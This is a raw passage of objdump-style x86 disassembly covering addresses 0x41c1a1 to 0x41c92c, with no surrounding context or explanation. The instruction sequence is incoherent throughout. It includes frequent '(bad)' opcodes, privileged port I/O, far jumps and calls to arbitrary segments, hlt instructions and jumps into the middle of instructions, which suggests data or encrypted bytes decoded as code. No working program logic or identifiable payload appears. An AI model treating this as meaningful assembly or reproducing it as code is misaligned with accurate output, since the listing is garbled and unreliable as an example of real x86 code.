  41c1a1:	lea    edx,[edi]
  41c1a3:	arpl   WORD PTR [eax+0x41de68fc],ax
  41c1a9:	outs   dx,DWORD PTR ds:[esi]
  41c1aa:	out    0x4c,eax
  41c1ac:	cs pop ebx
  41c1ae:	pushf  
  41c1af:	xchg   ecx,eax
  41c1b0:	retf   
  41c1b1:	nop
  41c1b2:	fsub   DWORD PTR [ebx+0x72cc3fa0]
  41c1b8:	jb     0x41c228
  41c1ba:	inc    ebp
  41c1bb:	call   0x59ad958d
  41c1c0:	pop    ax
  41c1c2:	pop    edi
  41c1c3:	(bad)  
  41c1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1c5:	adc    al,0x7a
  41c1c7:	xor    eax,0xbedfd19f
  41c1cc:	fcom   QWORD PTR [eax+ecx*1-0x66]
  41c1d0:	cld    
  41c1d1:	dec    edi
  41c1d2:	cmp    edi,esp
  41c1d4:	xchg   esi,eax
  41c1d5:	pushf  
  41c1d6:	sbb    al,0xc2
  41c1d8:	adc    ebx,DWORD PTR [eax+0x2f6af136]
  41c1de:	inc    esp
  41c1df:	leave  
  41c1e0:	jp     0x41c1bf
  41c1e2:	lods   eax,DWORD PTR ds:[esi]
  41c1e3:	push   eax
  41c1e4:	in     al,dx
  41c1e5:	xor    ebp,DWORD PTR [edx+0x64]
  41c1e8:	cmp    DWORD PTR [ecx+0x42d402ee],edx
  41c1ee:	push   es
  41c1ef:	or     BYTE PTR [eax+0x79387b3b],al
  41c1f5:	jno    0x41c1cd
  41c1f7:	out    0x38,eax
  41c1f9:	or     edi,DWORD PTR [edi+0x2e4e9826]
  41c1ff:	mov    edi,0x209091e1
  41c204:	ficom  DWORD PTR [eax]
  41c206:	bound  ecx,QWORD PTR ds:0x1e0291b2
  41c20c:	or     BYTE PTR [ecx+0x43],ah
  41c20f:	mov    ebx,0xbd8b556d
  41c214:	mov    bh,0x82
  41c216:	sub    bl,BYTE PTR [edi+0x6105bf77]
  41c21c:	pop    esi
  41c21d:	in     al,dx
  41c21e:	push   cs
  41c21f:	pop    ebp
  41c220:	cmp    eax,0x8d856a79
  41c225:	jbe    0x41c27c
  41c227:	in     eax,0xb4
  41c229:	xchg   BYTE PTR [ecx],al
  41c22b:	das    
  41c22c:	sub    edx,edi
  41c22e:	mov    ch,BYTE PTR [ebx-0x2a4e11bf]
  41c234:	push   ecx
  41c235:	cmp    al,BYTE PTR [ecx]
  41c237:	inc    ecx
  41c238:	test   ch,ch
  41c23a:	pop    edx
  41c23b:	xor    ebx,edi
  41c23d:	out    0x3c,eax
  41c23f:	aas    
  41c240:	sahf   
  41c241:	pop    es
  41c242:	fimul  DWORD PTR [esi]
  41c244:	scas   al,BYTE PTR es:[edi]
  41c245:	xor    al,0x5b
  41c247:	push   ebx
  41c248:	fst    DWORD PTR ds:0xeece06ed
  41c24e:	xchg   esp,eax
  41c24f:	je     0x41c1fa
  41c251:	sub    eax,0x93a8ffef
  41c256:	jae    0x41c1e4
  41c258:	sahf   
  41c259:	xor    DWORD PTR [edx-0x25],eax
  41c25c:	dec    ebp
  41c25d:	scas   eax,DWORD PTR es:[edi]
  41c25e:	push   cs
  41c25f:	xchg   ecx,eax
  41c260:	sahf   
  41c261:	xchg   edx,eax
  41c262:	mov    esp,0x7811d512
  41c267:	(bad)  
  41c269:	dec    esi
  41c26a:	jmp    0x59845a77
  41c26f:	jbe    0x41c250
  41c271:	or     BYTE PTR [ebx+0x2a869b45],ch
  41c277:	dec    ebx
  41c278:	dec    edx
  41c279:	push   esp
  41c27a:	pop    edi
  41c27b:	mov    ch,BYTE PTR [eax]
  41c27d:	pop    ebx
  41c27e:	fild   DWORD PTR [ebx+0x4b]
  41c281:	lods   al,BYTE PTR ds:[esi]
  41c282:	fmul   QWORD PTR [ecx-0x349c684b]
  41c288:	sbb    bh,dh
  41c28a:	add    ch,dl
  41c28c:	push   ecx
  41c28d:	(bad)  
  41c28e:	jg     0x41c2c0
  41c290:	cmp    DWORD PTR [eax],ecx
  41c292:	jnp    0x41c2e0
  41c294:	mul    BYTE PTR [edx]
  41c296:	test   eax,0x3d740689
  41c29b:	adc    al,0x98
  41c29d:	test   DWORD PTR ds:0x90304fdc,edi
  41c2a3:	or     ecx,edx
  41c2a5:	and    al,0x4e
  41c2a7:	xchg   BYTE PTR [ecx+0x45c246a2],dl
  41c2ad:	retf   
  41c2ae:	aas    
  41c2af:	hlt    
  41c2b0:	cmp    eax,0xf9e53911
  41c2b5:	fwait
  41c2b6:	cld    
  41c2b7:	ss mov esp,0x16bab181
  41c2bd:	out    dx,eax
  41c2be:	ss lahf 
  41c2c0:	inc    esi
  41c2c1:	jo     0x41c27e
  41c2c3:	test   ah,0xf1
  41c2c6:	xchg   ebx,eax
  41c2c7:	and    BYTE PTR [ebx+0x2d656ceb],dh
  41c2cd:	xchg   ecx,eax
  41c2ce:	mov    edi,DWORD PTR [esi-0x5b0aa87b]
  41c2d4:	mov    dh,0xa3
  41c2d6:	rol    BYTE PTR [ebx+0x5a607bee],1
  41c2dc:	lds    eax,FWORD PTR [edi]
  41c2de:	and    al,0x5c
  41c2e0:	jbe    0x41c2a8
  41c2e2:	mov    ds:0x88a9f2b,eax
  41c2e7:	and    al,0x5f
  41c2e9:	ud2    
  41c2eb:	pop    esp
  41c2ec:	stc    
  41c2ed:	sub    DWORD PTR [edi+0x17],0x65
  41c2f1:	cmp    eax,0xab73c9
  41c2f7:	dec    ebx
  41c2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2f9:	mov    edi,0x6852c819
  41c2fe:	pop    ds
  41c2ff:	hlt    
  41c300:	cs repnz daa 
  41c303:	aam    0xcb
  41c305:	stc    
  41c306:	pop    ecx
  41c307:	cli    
  41c308:	fsin   
  41c30a:	pop    es
  41c30b:	mov    dh,0x7b
  41c30d:	add    BYTE PTR [ebx],0x7c
  41c310:	(bad)  
  41c311:	mov    esi,0xca63d2e1
  41c316:	mov    ch,0x36
  41c319:	cs loope 0x41c324
  41c31c:	xchg   BYTE PTR [ecx+0x75],al
  41c31f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c320:	sub    BYTE PTR [edi+0x64778540],cl
  41c326:	xor    al,0x86
  41c328:	jge    0x41c320
  41c32a:	mov    dh,0xf6
  41c32c:	inc    eax
  41c32d:	in     eax,0xb8
  41c32f:	dec    esi
  41c330:	xchg   ecx,eax
  41c331:	sbb    DWORD PTR [esi],edi
  41c333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c334:	stos   BYTE PTR es:[edi],al
  41c335:	xchg   BYTE PTR [edi+0x11],cl
  41c338:	gs rdpmc 
  41c33b:	jle    0x41c3a4
  41c33d:	popa   
  41c33e:	je     0x41c309
  41c340:	pushf  
  41c341:	imul   esi,esp,0x6a
  41c344:	xchg   ebx,eax
  41c345:	sub    eax,DWORD PTR [esi-0x4d]
  41c348:	jmp    0x3160:0x7786abd4
  41c34f:	sbb    bl,BYTE PTR [ebp-0x3eed1a27]
  41c355:	ja     0x41c342
  41c357:	mov    ch,dh
  41c359:	mov    ds:0x5d65d934,al
  41c35e:	sbb    esi,DWORD PTR [ecx]
  41c360:	pusha  
  41c361:	andps  xmm6,xmm4
  41c364:	sbb    al,0x51
  41c366:	call   0xd8cb:0xd96bc5d7
  41c36d:	and    al,BYTE PTR ds:0x73aadc70
  41c373:	ins    BYTE PTR es:[edi],dx
  41c374:	sbb    BYTE PTR [esi+0x683883c5],0xed
  41c37b:	call   0xf5a41660
  41c380:	sar    DWORD PTR [ebx],0x9b
  41c383:	in     al,0x97
  41c385:	push   edx
  41c386:	cmp    esi,esi
  41c388:	cmp    al,0x3a
  41c38a:	pop    ss
  41c38b:	les    ebx,FWORD PTR [ebp-0x672fc2e9]
  41c391:	js     0x41c3d0
  41c393:	xor    eax,0x1f692028
  41c398:	lods   al,BYTE PTR ds:[esi]
  41c399:	loope  0x41c406
  41c39b:	imul   edx,DWORD PTR [edx-0x786fb2c6],0xffffff8d
  41c3a2:	cs aaa 
  41c3a4:	pop    ss
  41c3a5:	retf   0xdd47
  41c3a8:	push   esi
  41c3a9:	adc    DWORD PTR [edx+0x722849b],0x46
  41c3b0:	xor    bl,BYTE PTR ds:0x8b38d6d3
  41c3b6:	push   edi
  41c3b7:	inc    BYTE PTR [ecx-0x8d1c3de]
  41c3bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3be:	push   es
  41c3bf:	popa   
  41c3c0:	or     DWORD PTR [edi+eax*8-0x7fedfcb8],eax
  41c3c7:	test   DWORD PTR [edx+esi*1+0x5a639071],ebx
  41c3ce:	ins    DWORD PTR es:[edi],dx
  41c3cf:	mov    cl,0x79
  41c3d1:	fmul   st(2),st
  41c3d3:	imul   eax,DWORD PTR [ebp-0x11],0x236debc5
  41c3da:	push   0x30
  41c3dc:	test   eax,0xc0b1b10a
  41c3e1:	inc    esp
  41c3e2:	add    al,0x43
  41c3e4:	and    BYTE PTR [esi-0x4388f93f],dl
  41c3ea:	mov    dh,0x48
  41c3ec:	sub    al,0xa2
  41c3ee:	sbb    edx,DWORD PTR [edi-0x20]
  41c3f1:	mov    ecx,gs
  41c3f3:	mov    ecx,0xb8556367
  41c3f8:	sub    DWORD PTR [eax+ecx*1],edx
  41c3fb:	sbb    eax,0x98b9e2ed
  41c400:	pushf  
  41c401:	ror    ecx,1
  41c403:	mov    bh,0x22
  41c405:	inc    eax
  41c406:	and    BYTE PTR [esi],ah
  41c408:	enter  0x7cf3,0xba
  41c40c:	push   esi
  41c40d:	push   ss
  41c40e:	shld   DWORD PTR [edi+eax*8],ecx,0x2b
  41c413:	fdivr  DWORD PTR [ecx-0x51]
  41c416:	pop    DWORD PTR [edi-0x28]
  41c419:	cmp    BYTE PTR [edi],ch
  41c41b:	lds    ebp,FWORD PTR [edx*1-0x5cfd7c80]
  41c422:	xchg   esi,eax
  41c423:	sbb    ebp,ecx
  41c425:	add    al,0xd6
  41c427:	inc    ecx
  41c428:	lds    edi,FWORD PTR [ebp-0x57]
  41c42b:	cmp    edx,0x4c
  41c42e:	popa   
  41c42f:	xchg   ecx,eax
  41c430:	fld    QWORD PTR [esi]
  41c432:	jecxz  0x41c444
  41c434:	jecxz  0x41c41b
  41c436:	pop    edi
  41c437:	and    al,0x4a
  41c439:	ret    0x7b2d
  41c43c:	test   DWORD PTR [ebx+eiz*8-0x32],0x3233863b
  41c444:	rcr    BYTE PTR [ebx+0x2ea2d692],cl
  41c44a:	add    al,0xb
  41c44c:	pop    esp
  41c44d:	test   BYTE PTR [eax-0x28],ch
  41c450:	jae    0x41c4ae
  41c452:	fistp  DWORD PTR [edx-0x54dbe60d]
  41c458:	pop    edi
  41c459:	push   ds
  41c45a:	into   
  41c45b:	add    al,0xbb
  41c45d:	push   edi
  41c45e:	int    0x7e
  41c460:	push   ebp
  41c461:	mov    ecx,0x63f5f207
  41c466:	jne    0x41c4cc
  41c468:	test   eax,0xa646932a
  41c46d:	mov    eax,ds:0x14e5d379
  41c472:	cwde   
  41c473:	adc    BYTE PTR [ebx],cl
  41c475:	cs out 0xa1,al
  41c478:	mov    ds:0x33631346,eax
  41c47d:	clc    
  41c47e:	lods   eax,DWORD PTR ds:[esi]
  41c47f:	in     eax,dx
  41c480:	sbb    DWORD PTR [edi-0x282150e5],ecx
  41c486:	cdq    
  41c487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c488:	ss jnp 0x41c46b
  41c48b:	inc    eax
  41c48c:	pop    ss
  41c48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c48e:	fidiv  WORD PTR [ecx+0x3f]
  41c491:	or     ch,BYTE PTR [ecx-0x64a45fa9]
  41c497:	dec    esi
  41c498:	or     al,0xe4
  41c49a:	inc    esi
  41c49b:	adc    eax,0x2328063d
  41c4a0:	adc    bl,ch
  41c4a2:	and    eax,0x3769f75b
  41c4a7:	adc    DWORD PTR [edx+0x583e7546],ebx
  41c4ad:	mov    ah,0x93
  41c4af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4b0:	inc    eax
  41c4b1:	bound  esi,QWORD PTR [edi+0x7e]
  41c4b4:	int3   
  41c4b5:	jp     0x41c522
  41c4b7:	inc    edx
  41c4b8:	add    eax,0xb93cdb7
  41c4bd:	test   BYTE PTR [eax-0x33acf14c],bh
  41c4c3:	or     eax,0x6a49743c
  41c4c8:	xor    edi,DWORD PTR [ebp-0x34ca3f16]
  41c4ce:	sbb    al,0x44
  41c4d0:	inc    esi
  41c4d1:	xor    eax,0x9949ce77
  41c4d6:	repz cmp esi,edi
  41c4d9:	jl     0x41c541
  41c4db:	sbb    eax,0x518446e8
  41c4e0:	adc    al,0xfb
  41c4e2:	lods   al,BYTE PTR ds:[esi]
  41c4e3:	adc    dh,0x9
  41c4e6:	cdq    
  41c4e7:	das    
  41c4e8:	imul   edi,DWORD PTR [edi+esi*4+0x22],0x3e6e2e70
  41c4f0:	mov    DWORD PTR [ebp+0x5d],esp
  41c4f3:	stos   BYTE PTR es:[edi],al
  41c4f4:	(bad)  
  41c4f5:	(bad)  
  41c4f6:	adc    ecx,DWORD PTR [ebp+0x2a]
  41c4f9:	test   DWORD PTR [ebx+0x33],eax
  41c4fc:	mov    WORD PTR [ebp+0x65],gs
  41c4ff:	in     eax,0x5
  41c501:	ja     0x41c552
  41c503:	aas    
  41c504:	ffreep st(2)
  41c506:	jp     0x41c4cd
  41c508:	rcl    DWORD PTR [eax-0x5d712cab],cl
  41c50e:	js     0x41c4f4
  41c510:	xor    eax,esp
  41c512:	rcr    esi,0xf
  41c515:	out    dx,eax
  41c516:	fmul   st(4),st
  41c518:	imul   esp,DWORD PTR [ebx-0x14],0xe3b740ba
  41c51f:	dec    ecx
  41c520:	arpl   bx,bx
  41c522:	adc    eax,0xa7702d63
  41c527:	adc    ecx,DWORD PTR [ebp+0x7d]
  41c52a:	scas   al,BYTE PTR es:[edi]
  41c52b:	ret    
  41c52c:	and    BYTE PTR [esi+0x2a00a14d],dl
  41c532:	pop    ss
  41c533:	aaa    
  41c534:	ds das 
  41c536:	mov    edi,0x43b37ed8
  41c53b:	xor    al,BYTE PTR [eax-0x23b5970c]
  41c541:	sbb    al,0x92
  41c543:	xor    DWORD PTR [ecx],ebp
  41c545:	es jge 0x41c523
  41c548:	popa   
  41c549:	(bad)  
  41c54a:	push   eax
  41c54b:	dec    eax
  41c54c:	push   0xd7a9a0fe
  41c551:	cs test al,0xf3
  41c554:	mov    WORD PTR [edx],?
  41c556:	xchg   cl,cl
  41c558:	ret    0x5c38
  41c55b:	pop    eax
  41c55c:	mov    ecx,0x28989669
  41c561:	rol    ecx,0xaa
  41c564:	dec    edi
  41c565:	(bad)  
  41c566:	xchg   ebp,eax
  41c567:	mov    esi,0x49044653
  41c56c:	hlt    
  41c56d:	ret    
  41c56e:	(bad)
  41c572:	sahf   
  41c573:	push   ss
  41c574:	repnz cmp BYTE PTR [ecx-0x23d3c14d],dl
  41c57b:	add    ebx,ebp
  41c57d:	rcr    DWORD PTR [eax+0x35],1
  41c580:	mov    bh,0xa6
  41c582:	push   esi
  41c583:	push   cs
  41c584:	mov    ch,0x6b
  41c586:	aaa    
  41c587:	adc    DWORD PTR [eax],edi
  41c589:	pop    edi
  41c58a:	pop    ecx
  41c58b:	ss or  al,0x49
  41c58e:	mov    WORD PTR ds:0xea84e93d,?
  41c594:	push   eax
  41c595:	(bad)  
  41c597:	or     DWORD PTR [eax+0x1a6b54a9],esp
  41c59d:	jp     0x41c537
  41c59f:	push   cs
  41c5a0:	ins    BYTE PTR es:[edi],dx
  41c5a1:	in     eax,dx
  41c5a2:	dec    eax
  41c5a3:	iret   
  41c5a4:	arpl   WORD PTR [eax*8+0x2a464276],sp
  41c5ab:	cdq    
  41c5ac:	shl    DWORD PTR ds:0x9dc6422c,1
  41c5b2:	rol    BYTE PTR [eax],0x3f
  41c5b5:	scas   eax,DWORD PTR es:[edi]
  41c5b6:	je     0x41c610
  41c5b8:	daa    
  41c5b9:	pop    ebx
  41c5ba:	fsubrp st(3),st
  41c5bc:	and    al,0x41
  41c5be:	mov    al,0xa9
  41c5c0:	dec    ebp
  41c5c1:	push   edx
  41c5c2:	addr16 loope 0x41c5ae
  41c5c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5c6:	in     al,0xe3
  41c5c8:	lods   eax,DWORD PTR ds:[esi]
  41c5c9:	and    bl,BYTE PTR [di+0x76]
  41c5cd:	retf   
  41c5ce:	bound  eax,QWORD PTR [esp+ebx*2+0x40]
  41c5d2:	std    
  41c5d3:	imul   eax,DWORD PTR [edi],0x9b3d0f63
  41c5d9:	call   0x78eb4b2a
  41c5de:	nop
  41c5df:	in     eax,dx
  41c5e0:	loopne 0x41c58f
  41c5e2:	xchg   BYTE PTR [ebx],cl
  41c5e4:	adc    dh,BYTE PTR [eax-0x47d5ed73]
  41c5ea:	xchg   edx,eax
  41c5eb:	mov    ebp,0xe8eb3c8f
  41c5f0:	inc    ebx
  41c5f1:	outs   dx,DWORD PTR ds:[esi]
  41c5f2:	add    eax,ebx
  41c5f4:	aam    0x29
  41c5f6:	repz jbe 0x41c58d
  41c5f9:	sub    edi,DWORD PTR [edi]
  41c5fb:	call   0xe4c755c4
  41c600:	rcr    DWORD PTR [eax-0x1452754b],cl
  41c606:	xor    al,0x8b
  41c608:	neg    bl
  41c60a:	xor    esi,DWORD PTR [edi]
  41c60c:	push   esp
  41c60d:	xor    DWORD PTR [ebx-0x2d],eax
  41c610:	out    dx,eax
  41c611:	je     0x41c5b1
  41c613:	mov    ch,0x84
  41c615:	out    0x14,al
  41c617:	cmp    bl,BYTE PTR [ecx]
  41c619:	dec    esi
  41c61a:	test   DWORD PTR [eax+0x5f443027],ebx
  41c620:	and    al,0xb7
  41c622:	dec    edi
  41c623:	xchg   ecx,eax
  41c624:	mov    eax,0xb86cb8f5
  41c629:	or     eax,0xc2f6a376
  41c62e:	mov    esp,DWORD PTR [edx]
  41c630:	int    0x15
  41c632:	jbe    0x41c695
  41c634:	push   eax
  41c635:	dec    eax
  41c636:	sub    ch,BYTE PTR [ecx+0x10]
  41c639:	pop    edi
  41c63a:	pusha  
  41c63b:	or     DWORD PTR [edx],edx
  41c63d:	or     eax,0x30d71b7
  41c642:	pop    eax
  41c643:	and    BYTE PTR [edi+0x2562c741],0x4b
  41c64a:	in     eax,0xa1
  41c64c:	mov    edi,0x18fec15e
  41c651:	out    dx,eax
  41c652:	jae    0x41c64f
  41c654:	mov    al,ds:0xef38f20f
  41c659:	xor    ebp,DWORD PTR [ebp+0x76]
  41c65c:	arpl   WORD PTR [edx+0x7451ef20],cx
  41c662:	fs test esp,esp
  41c665:	or     BYTE PTR [edi],ah
  41c667:	out    dx,al
  41c668:	mov    ah,0xe
  41c66a:	hlt    
  41c66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c66c:	mov    edi,0xda4bc068
  41c671:	mov    ecx,0xf31b736
  41c676:	call   0x4ee6:0xa608ef67
  41c67d:	mov    BYTE PTR [ebx+0x542dc3bb],0xd4
  41c684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c685:	retf   0x7cc3
  41c688:	stc    
  41c689:	ins    DWORD PTR es:[edi],dx
  41c68a:	dec    esi
  41c68b:	stos   BYTE PTR es:[edi],al
  41c68c:	sar    DWORD PTR [ebp-0x6def1418],1
  41c692:	pop    ds
  41c693:	aas    
  41c694:	in     eax,dx
  41c695:	jmp    0xc7e2:0xf5ae1e58
  41c69c:	sub    al,0x6f
  41c69e:	sti    
  41c69f:	inc    esi
  41c6a0:	das    
  41c6a1:	cmovge ecx,DWORD PTR [edi+0x75639c4d]
  41c6a8:	pushf  
  41c6a9:	js     0x41c6f6
  41c6ab:	jns    0x41c70f
  41c6ad:	add    ecx,DWORD PTR [eax-0x23]
  41c6b0:	pop    ebp
  41c6b1:	(bad)  
  41c6b2:	call   0x5a90:0x1d58378
  41c6b9:	mov    eax,0xab7cff38
  41c6be:	inc    edi
  41c6bf:	int    0x53
  41c6c1:	les    eax,FWORD PTR es:[ebp+edx*8-0x474f565d]
  41c6c9:	dec    eax
  41c6ca:	mov    ds:0x5d7e5045,eax
  41c6cf:	leave  
  41c6d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6d1:	mov    bh,0xc7
  41c6d3:	inc    edx
  41c6d4:	sbb    BYTE PTR [ebx*2+0x5a9eddad],0x74
  41c6dc:	repnz rcl BYTE PTR [ebp-0xca3ee5],0x89
  41c6e4:	into   
  41c6e5:	dec    edi
  41c6e6:	jmp    0x41c714
  41c6e8:	sbb    edx,ebp
  41c6ea:	popa   
  41c6eb:	ss inc edi
  41c6ed:	(bad)  
  41c6ee:	cli    
  41c6ef:	stc    
  41c6f0:	pop    es
  41c6f1:	pusha  
  41c6f2:	mov    BYTE PTR [edi],ah
  41c6f4:	sub    eax,0xebe7cc0b
  41c6f9:	mov    dh,0x5f
  41c6fb:	sub    eax,0xd84bf0c6
  41c700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c701:	test   DWORD PTR [ebp-0x5b665227],edx
  41c707:	out    0x54,al
  41c709:	mov    ebx,0x1773cb2e
  41c70e:	and    DWORD PTR [edx-0x5212e8c],edi
  41c714:	cmp    bh,dl
  41c716:	arpl   WORD PTR [ecx],ax
  41c718:	or     ebx,esi
  41c71a:	jbe    0x41c713
  41c71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c71d:	cmp    BYTE PTR [esp+ecx*4+0x7fa6e3fa],dh
  41c724:	lea    esi,[esi+0x494187db]
  41c72a:	es mov ebp,0xe30ef0cb
  41c730:	xchg   esp,eax
  41c731:	retf   0x449a
  41c734:	dec    esi
  41c735:	mov    ebx,DWORD PTR [edx+0x4c42e222]
  41c73b:	test   eax,0xce82e1c2
  41c740:	push   esp
  41c741:	call   0x3ee5:0xd1452545
  41c748:	arpl   cx,di
  41c74a:	test   DWORD PTR [esi+edi*1-0x2b5f50f8],0x36b678a3
  41c755:	(bad)  
  41c756:	jmp    0x41c6f3
  41c758:	sti    
  41c759:	mov    ah,0x8e
  41c75b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c75c:	ins    BYTE PTR es:[edi],dx
  41c75d:	stc    
  41c75e:	and    al,0x57
  41c760:	mov    DWORD PTR [edx+0x3c0e2ee6],ebp
  41c766:	or     al,0x1
  41c768:	mov    edx,0xfb77010b
  41c76d:	xchg   ebx,eax
  41c76e:	out    0xe0,eax
  41c770:	push   esi
  41c771:	iret   
  41c772:	ja     0x41c7ed
  41c774:	arpl   di,si
  41c776:	(bad)  
  41c777:	cli    
  41c778:	jne    0x41c74d
  41c77a:	or     BYTE PTR [ebp+0x604c7374],dh
  41c780:	fcom   DWORD PTR ss:[ebx+0x66]
  41c784:	or     al,0xfa
  41c786:	inc    esp
  41c787:	cmp    al,0x92
  41c789:	mov    esi,0x85baff94
  41c78e:	mov    eax,0xe5ef32f1
  41c793:	jbe    0x41c798
  41c795:	adc    edx,DWORD PTR [ecx]
  41c797:	ss jle 0x41c7f8
  41c79a:	push   es
  41c79b:	imul   eax,DWORD PTR [esi*2-0x5bf9272a],0xffffffe8
  41c7a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7a4:	mov    ebx,0xa399e579
  41c7a9:	mov    ds:0xa0ded6cb,al
  41c7ae:	pop    esi
  41c7af:	mov    ss,ebx
  41c7b1:	pop    ebp
  41c7b2:	jg     0x41c7cd
  41c7b4:	jne    0x41c77c
  41c7b6:	out    dx,eax
  41c7b7:	sub    al,dh
  41c7b9:	stos   BYTE PTR es:[edi],al
  41c7ba:	and    eax,DWORD PTR [eax+0x79fde025]
  41c7c0:	mov    bh,0xa1
  41c7c2:	pop    ds
  41c7c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7c4:	imul   edx,edi,0x25
  41c7c7:	inc    esp
  41c7c8:	push   ecx
  41c7c9:	push   di
  41c7cb:	jnp    0x41c7ba
  41c7cd:	mov    dh,0x65
  41c7cf:	push   ebx
  41c7d0:	out    0x49,eax
  41c7d2:	xchg   BYTE PTR [eax+edx*1+0x73b9fe65],bl
  41c7d9:	fdiv   DWORD PTR [esi+ecx*4+0x54]
  41c7dd:	and    BYTE PTR [edx-0x50],bh
  41c7e0:	adc    eax,DWORD PTR [ecx]
  41c7e2:	enter  0xe854,0x93
  41c7e6:	adc    DWORD PTR [ecx+ebp*8-0x2e],ebp
  41c7ea:	jae    0x41c784
  41c7ec:	jmp    0xb1a5:0x71be7b40
  41c7f3:	dec    DWORD PTR [edi-0x1e]
  41c7f6:	inc    esi
  41c7f7:	inc    ebp
  41c7f8:	mov    DWORD PTR [eax+0x9ed8952],edx
  41c7fe:	(bad)  
  41c7ff:	or     eax,DWORD PTR [ebp+edx*8+0x3c74e882]
  41c806:	mov    BYTE PTR [ecx-0x15],bl
  41c809:	mov    BYTE PTR [eax+edx*4+0x476aa79f],bl
  41c810:	mov    esp,0x8d306f6a
  41c815:	ja     0x41c845
  41c817:	pop    esi
  41c818:	rcl    DWORD PTR [edi-0x1617d817],cl
  41c81e:	jne    0x41c899
  41c820:	inc    ecx
  41c821:	scas   al,BYTE PTR es:[edi]
  41c822:	int3   
  41c823:	push   edi
  41c824:	dec    edi
  41c825:	test   BYTE PTR [ecx+0x79],cl
  41c828:	xchg   ecx,eax
  41c829:	or     esi,DWORD PTR [edx+0x36]
  41c82c:	inc    edx
  41c82d:	(bad)  
  41c82e:	jle    0x41c8a4
  41c830:	inc    ecx
  41c831:	push   0x8527237
  41c836:	push   eax
  41c837:	mov    esp,0x29059261
  41c83c:	dec    edx
  41c83d:	xor    BYTE PTR ds:0x50ed6d7a,dl
  41c843:	daa    
  41c844:	sub    al,0x75
  41c846:	mul    DWORD PTR [edi+eiz*2]
  41c849:	rcl    DWORD PTR [eax-0x2c],0x45
  41c84d:	pop    ss
  41c84e:	in     al,dx
  41c84f:	push   esi
  41c850:	sar    esp,0x62
  41c853:	xlat   BYTE PTR ds:[ebx]
  41c854:	shr    esi,0x5e
  41c857:	pushf  
  41c858:	jmp    DWORD PTR [ebp+ebx*8-0x3b]
  41c85c:	mov    esp,0xcc04ea53
  41c861:	test   eax,0x9c8748a2
  41c866:	pop    es
  41c867:	push   ebx
  41c868:	popf   
  41c869:	sub    esi,DWORD PTR [edx]
  41c86b:	and    bl,BYTE PTR ds:0x2f465a62
  41c871:	daa    
  41c872:	mov    WORD PTR [eax-0x22],ss
  41c875:	mov    ds:0x1f734e23,eax
  41c87a:	imul   eax,DWORD PTR [ebx],0xffffffa3
  41c87d:	mov    cs,WORD PTR [ebx+0xdcb4e93]
  41c883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c884:	aaa    
  41c885:	dec    eax
  41c886:	outs   dx,BYTE PTR ss:[esi]
  41c888:	les    esi,FWORD PTR [ecx+edx*1]
  41c88b:	dec    eax
  41c88c:	scas   eax,DWORD PTR es:[edi]
  41c88d:	xchg   ebx,eax
  41c88e:	shl    dh,0x84
  41c891:	xchg   edi,eax
  41c892:	adc    BYTE PTR [eax-0x53],al
  41c895:	dec    esp
  41c896:	fist   DWORD PTR [edx]
  41c898:	imul   esp,DWORD PTR [ecx-0x19],0x1d
  41c89c:	cmp    al,0xfe
  41c89e:	add    al,0x43
  41c8a0:	hlt    
  41c8a1:	ficom  DWORD PTR ds:0x78217aa3
  41c8a7:	enter  0xf39f,0x72
  41c8ab:	inc    ebp
  41c8ac:	(bad)  
  41c8ad:	or     BYTE PTR [ecx-0x3f],dl
  41c8b0:	jp     0x41c841
  41c8b2:	cwde   
  41c8b3:	icebp  
  41c8b4:	and    BYTE PTR [edi+0x4b],al
  41c8b7:	js     0x41c908
  41c8b9:	cmp    DWORD PTR [edx-0x74e6245e],ecx
  41c8bf:	add    eax,0xd3a13d9a
  41c8c4:	cmp    dh,0x6
  41c8c7:	jge    0x41c8cd
  41c8c9:	mov    bh,0x7a
  41c8cb:	lds    ebx,FWORD PTR [edx-0x76]
  41c8ce:	cli    
  41c8cf:	pop    es
  41c8d0:	repz jno 0x41c873
  41c8d3:	aam    0x9f
  41c8d5:	ja     0x41c8c9
  41c8d7:	jl     0x41c867
  41c8d9:	add    eax,0x95656d9e
  41c8de:	outs   dx,DWORD PTR ds:[esi]
  41c8df:	fwait
  41c8e0:	dec    ecx
  41c8e1:	es push es
  41c8e3:	ins    BYTE PTR es:[edi],dx
  41c8e4:	and    eax,0x7319c1d6
  41c8e9:	or     ebx,DWORD PTR [eax]
  41c8eb:	data16 js 0x41c89d
  41c8ee:	repz popa 
  41c8f0:	arpl   WORD PTR [ebp+0x7a7f5360],sp
  41c8f6:	xchg   ebp,eax
  41c8f7:	mov    ebx,0x7144d622
  41c8fc:	sbb    eax,0x190e0aee
  41c901:	cmc    
  41c902:	test   al,0xd5
  41c904:	jns    0x41c8e6
  41c906:	call   DWORD PTR ds:0x1f243520
  41c90c:	xchg   edi,eax
  41c90d:	inc    ecx
  41c90e:	shl    BYTE PTR [edi],0xbf
  41c911:	cld    
  41c912:	cld    
  41c913:	(bad)  
  41c914:	lock push 0x2b66d55
  41c91a:	jge    0x41c925
  41c91c:	xchg   esp,eax
  41c91d:	dec    ebx
  41c91e:	jnp    0x41c978
  41c920:	xchg   ecx,eax
  41c921:	add    bh,BYTE PTR [edx]
  41c923:	cwde   
  41c924:	out    dx,al
  41c925:	jbe    0x41c8aa
  41c927:	sub    al,0xf0
  41c929:	jle    0x41c8c2
  41c92b:	cmc    
  41c92c:	mov    ah,0x49
